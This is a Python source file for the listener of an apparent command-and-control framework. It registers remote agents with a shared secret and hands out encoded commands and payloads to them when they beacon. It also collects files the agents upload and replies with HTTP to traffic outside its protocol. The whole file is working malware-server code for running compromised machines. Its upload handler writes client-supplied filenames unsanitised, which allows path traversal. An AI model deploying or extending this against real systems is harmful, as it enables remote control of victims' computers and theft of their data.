import os
import socket
import uuid
import ssl
import threading
import logging
import time
import json
import zlib
import base64
from rich import print
from common.agent import Agent
from common.responses import serve_http


class Listener(object):
    def __init__(self, port, host, secret, agents, listeners, _keyboard_interrupt):
        self.uuid = uuid.uuid4()
        self.host = host
        self.port = port

        self.agents = agents
        self.listeners = listeners
        self.secret = secret

        self.download_folder = "/tmp/downloads/"

        self._keyboard_interrupt = _keyboard_interrupt

        self.logger = logging.getLogger(__name__)
        logging.debug(str(self.uuid) + " Listener spawned")

    def FILE_TRANSFER(self, json_stub):
        logging.debug(str(self.uuid) + " Got BLOB fragment")
        blob_data = zlib.decompress(base64.b85decode(json_stub["data"]))
        blob_offset = json_stub["offset"]
        blob_name = json_stub["filename"]
        if not os.path.exists(self.download_folder):
            os.makedirs(self.download_folder)
        with open(self.download_folder + blob_name, "ab") as b:
            b.seek(blob_offset)
            b.write(blob_data)
        response_packet_stub = {"status": "ACK", "offset": blob_offset}
        cmd_pkt = "_response" + json.dumps(response_packet_stub)
        return cmd_pkt.encode()

    def get_response(self, json_stub):
        agent_uuid = json_stub["uuid"]
        response = json_stub["data"]

        # Custom protocol methods
        method = getattr(self, json_stub["status"])
        if method:
            return method(json_stub)

        for uuid, agent in self.agents.items():
            if uuid == agent_uuid and response:
                agent.update_lastseen()
                print(response)
        return '_response{"status" : "ACK"}'.encode()

    def associate_agent(self, json_stub):
        agent_uuid = json_stub["uuid"]  # this should probably incorporate server secret
        logging.debug(str(self.uuid) + " Associating agent with UUID: " + agent_uuid)
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                logging.debug(
                    str(self.uuid) + " Agent already seen! Updating lastseen time."
                )
                agent.update_lastseen()

        lastseen = time.time()
        enumdata = json_stub["enumdata"]
        tmp_agent = Agent(self, agent_uuid, lastseen, enumdata)
        self.agents[agent_uuid] = tmp_agent

        logging.debug(str(self.uuid) + " Agent associated successfully.")
        return '_response{"status" : "ACK"}'.encode()

    def handle_beacon(self, json_stub):
        agent_uuid = json_stub["uuid"]
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                agent.update_lastseen()
                # Commands take precedence over payloads
                command = agent.get_command()
                if command:
                    response_packet_stub = {
                        "status": "OK",
                        "command": base64.b85encode(command.encode()).decode(),
                        "payload": None,
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                payload = agent.get_payload()
                if payload:
                    response_packet_stub = {
                        "status": "OK",
                        "command": None,
                        "payload": base64.b85encode(payload.encode()).decode(),
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    return cmd_pkt.encode()

                response_packet_stub = {
                    "status": "OK",
                    "command": None,
                    "payload": None,
                }
                cmd_pkt = "_response" + json.dumps(response_packet_stub)
                return cmd_pkt.encode()

    def handle_proto_msg(self, proto_msg):
        logging.debug(
            str(self.uuid) + " Handling protocol message: " + proto_msg[0:125]
        )
        if "_associate" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[10:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.associate_agent(json_stub)
            except KeyError:
                return False
        elif "_beacon" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[7:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.handle_beacon(json_stub)
            except KeyError:
                return False
        elif "_response" in proto_msg:
            logging.debug(str(self.uuid) + " Handling response packet ")
            try:
                json_stub = json.loads(proto_msg[9:])
            except:
                return False
            try:
                if json_stub["secret"] == self.secret:
                    return self.get_response(json_stub)
            except KeyError:
                return False
        else:
            return serve_http(proto_msg)
        return

    def remove_from_list(self):
        self.listeners.remove(self)

    def main_thread(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
        except PermissionError as e:
            print("[red]Could not start listener: Permission Error[/red]")
            logging.debug("Could not start listener: Permission Error", exc_info=True)
            self.remove_from_list()
            return
        except OverflowError:
            print("[red]Could not start listener: Bad port range[/red]")
            logging.debug("Could not start listener: Bad port range", exc_info=True)
            self.remove_from_list()
            return
        except socket.gaierror:
            print(
                "[red]Could not start listener: No address associated with hostname[/red]"
            )
            logging.debug(
                "Could not start listener: No address associated with hostname",
                exc_info=True,
            )
            self.remove_from_list()
            return
        except OSError:
            print("[red]Could not start listener: Socket already bound[/red]")
            logging.debug(
                "Could not start listener: Socket already bound", exc_info=True
            )
            self.remove_from_list()
            return

        while not self._keyboard_interrupt.is_set():
            try:
                connection, address = self.sock.accept()
                # Upgrade socket to TLS
                context = ssl.SSLContext()
                context.maximum_version = ssl.TLSVersion.TLSv1_2
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.verify_mode = ssl.CERT_OPTIONAL
                context.load_cert_chain("reave/data/cert.pem")
                wrapped_socket = context.wrap_socket(
                    connection, server_side=True, do_handshake_on_connect=False
                )
                wrapped_socket.settimeout(5)
                threading.Thread(
                    target=self.listenToClient, args=(wrapped_socket,)
                ).start()
            except socket.timeout:
                pass
            except ssl.SSLError:
                logging.debug(str(self.uuid) + " Listener SSL error.", exc_info=True)
                pass
        if self._keyboard_interrupt.is_set():
            logging.debug(str(self.uuid) + " Listener caught interrupt, closing socket")
            self.sock.close()

    def listenToClient(self, client):
        size = 16384
        while not self._keyboard_interrupt.is_set():
            try:
                data = client.recv(size)
                if data:
                    response = self.handle_proto_msg(data.decode())
                    if response:
                        client.send(response)
                else:
                    logging.debug(str(self.uuid) + " Client disconnect")
                    client.close()
                    return False
            except socket.timeout:
                logging.debug(str(self.uuid) + " Client timeout", exc_info=True)
                client.close()
                return False
            except ConnectionResetError:
                logging.debug(
                    str(self.uuid) + " Client closed connection.", exc_info=True
                )
                client.close()
                return False
            except ssl.SSLError:
                logging.debug(str(self.uuid) + " Listener SSL error.", exc_info=True)
                client.close()
                return False
        if self._keyboard_interrupt.is_set():
            logging.debug(str(self.uuid) + " Listener caught interrupt, closing client")
            client.close()
            return False
